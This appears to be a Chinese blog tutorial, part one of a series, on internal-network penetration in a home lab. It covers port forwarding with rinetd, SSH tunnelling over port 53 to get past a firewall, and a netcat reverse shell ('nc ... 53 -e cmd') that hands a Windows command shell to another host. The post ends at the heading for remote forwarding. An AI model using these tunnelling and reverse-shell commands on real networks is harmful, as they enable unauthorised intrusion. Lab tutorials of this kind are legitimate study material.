内网渗透总结(一)

2016-12-15

本来想总结一下内网渗透的知识，没想到环境搭建费了不少功夫，一下午就成功了这么点，放假再继续跟新吧！！！

环境拓扑图

环境搭建

关于防火墙，我使用MonoWall，配置两条网卡，一个hostonly，一个桥接或者net。启用dncp服务，实现对xp的ip地址的分发。xp模拟内网与防火墙连接，防火墙只开启允许内网访问外网53端口。防火墙另外一个网卡与外网相连，再外网中有一台server 03 的机器，其中开启web服务，3389端口等

###
| 主机 | ip |
| :———-| :———|
| xp | 1.1.1.10 |
| server 03| 192.168.2.161|
| kali 2.0 | 192.168.2.227|
| cent os | 1.1.1.11 |
那么如何使xp与外网进行通信呢？

使用Rinetd进行端口转发

突破防火墙限制访问外网80端口

配置Rinetd : vim /etc/rinetd.conf

使用rinetd命令启动；
ps axu |grep rinetd查看进程是否开启；
netstat -pantu | grep :53对端口进行确认。

然后在xp 上访问http:192.168.2.227:53,成功访问到192.168.2.161主机的80端口

突破防火墙限制访问3389端口

对rinetd进行重新配置

pkill rinetd 停止rinetd的运行
rinetd 启动，使配置文件生效

突破防火墙限制，nc getshell

和上面一样，重新配置，具体我就不截图了
在server 03上nc -lvvp 4444

在xp上 执行nc 192.168.2.227 53 -e cmd
获得反弹shell

使用ssh进行端口转发

修改配置文件：
/etc/ssh/sshd_config
–PermitRootLogin yes
–Port 53
–PasswordAuthentication yes

当两台主机建立ssh隧道之后，隧道既可以看作为A主机一部分，也可看做为B主机一部分。因此当①处的ip即可以是A的ip，也可以是B的ip

ssh本地转发：本地侦听端口，访问转发到远程主机制定端口

ssh命令格式是：
ssh -L <listen port>:<目的 ip>:<目的 port> user@<ssh server> -p <ssh server port>
server port 默认为22

以上命令的意思是：
我们先在A机器上侦听本机7001端口，而A机器将把7001端口的数据加密并转发到B机器上。B收到之后先解密然后将数据发送到192.168.2.161的80端口。

这时你会发现，每转发一次，都将登录一次，能不能将它放入后台进程呢？答案是可以的，我们可以使用下面命令
ssh -fCN -L 7002:192.168.2.161:80 root@192.168.2.227 -p 53
-L 本地侦听
-C 压缩
-f 后台运行进程
-N 不执行登录shell
-g 复用时作为网关，支持多主机访问本地侦听端口

如果服务在B本身上呢？
开启 kali apache服务，仿照上面命令执行ssh -fCN -L 7003:192.168.2.227:80 root@192.168.2.227 -p 53就可以了，但是细心的同学可能会发现，网上的资料都是ssh -fCN -L 7003:127.0.0.1:80 root@192.168.2.227 -p 53，这是为什么呢？答案就在我上边说的那段话，建立ssh隧道之后，隧道上的某一节点既可以看作为client上的，也可以看做为server上的，因此两条命令执行效果一样。

再看看 -g参数，执行ssh -fCNg -L 7006:192.168.2.161:3389 root@192.168.2.227 -p 53,发现7005端口已经对所有主机开放了

这时，我们在xp上连接server 03 3389端口
或者用nc 拿xp shell

远程端口转发： 远程侦听端口，访问转发到本地主机指定端口
